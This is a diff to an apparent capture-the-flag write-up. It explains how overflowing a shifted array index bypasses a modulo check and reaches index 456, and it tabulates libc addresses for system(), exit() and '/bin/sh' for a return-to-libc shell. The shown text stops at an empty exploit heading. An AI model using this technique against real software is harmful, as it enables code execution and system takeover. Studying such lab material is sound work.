@@ -97,6 +97,20 @@ data[index<<2] = number
 On writting to index 1 it will write to `data[1 << 2] = number`, same as `data[4] = number` .
 On writting to index 114 it will write to `data[114 << 2] = number`, same as `data[456] = number` .
 
+In the binary representation (32 bits), value `114` looks like:
+```
+0000 0000   0000 0000   0000 0000   0111 0010
+```
+Shift operation is destructive. Excess bits shifted off to the left are discarded, and zero bits are shifted in from the right.
+Knowing that `store_number()` use rigth-shift operation (multiplication x4) `data[index << 2] = number`, first two MSB bits can be set switch on.
+
+In the first time it will make pass the condition %3, and in the second time at the time of <<2 will result in index 456
+| Binary value                                    | Decimal value  | Modulo result | Usable | Binary value after shift <<2                    | Decimal value after shift <<2 |
+|-------------------------------------------------|----------------|---------------|--------|-------------------------------------------------|-------------------------------|
+| `0100 0000   0000 0000   0000 0000   0111 0010` | 1073741938     | 1             | Yes    | `0000 0000   0000 0000   0000 0001   1100 1000` | 456                           |
+| `1000 0000   0000 0000   0000 0000   0111 0010` | 2147483762     | 2             | Yes    | `0000 0000   0000 0000   0000 0001   1100 1000` | 456                           |
+| `1100 0000   0000 0000   0000 0000   0111 0010` | 3221225586     | 0             | No     | `0000 0000   0000 0000   0000 0001   1100 1000` | 456                           |
+
 Retrieve `system()`, `exit()` and `"/bin/sh"` addresses.
 ```gdb
 [...]
@@ -118,19 +132,13 @@ $4 = 4159040368
 gdb-peda$ p/d 0xf7f897ec
 $5 = 4160264172
 ```
-In the binary representation (32 bits), value `114` looks like:
-```
-0000 0000   0000 0000   0000 0000   0111 0010
-```
-Shift operation is destructive. Excess bits shifted off to the left are discarded, and zero bits are shifted in from the right.
-Knowing that `store_number()` use rigth-shift operation (multiplication x4) `data[index << 2] = number`, first two MSB bits can be set switch on.
+Decimal values can be stored in data storage following by `quit` command to return from `main()` into a new shell process.
 
-In the first time it will make pass the condition %3, and in the second time at the time of <<2 will result in index 456
-| Binary value                                    | Decimal value  | Modulo result | Usable | Binary value after shift <<2                    | Decimal value after shift <<2 |
-|-------------------------------------------------|----------------|---------------|--------|-------------------------------------------------|-------------------------------|
-| `0100 0000   0000 0000   0000 0000   0111 0010` | 1073741938     | 1             | Yes    | `0000 0000   0000 0000   0000 0001   1100 1000` | 456                           |
-| `1000 0000   0000 0000   0000 0000   0111 0010` | 2147483762     | 2             | Yes    | `0000 0000   0000 0000   0000 0001   1100 1000` | 456                           |
-| `1100 0000   0000 0000   0000 0000   0111 0010` | 3221225586     | 0             | No     | `0000 0000   0000 0000   0000 0001   1100 1000` | 456                           |
+| Value     | Address     | Decimal value | Index                      |
+|-----------|-------------|---------------|----------------------------|
+| system()  | 0xf7e6aed0  | 4159090384    | 114(1073741938,2147483762) |
+| exit()    | 0xf7e5eb70  | 4159040368    | 115                        |
+| "/bin/sh" | 0xf7f897ec  | 4160264172    | 116                        |
 
 # Exploit
 ```shell
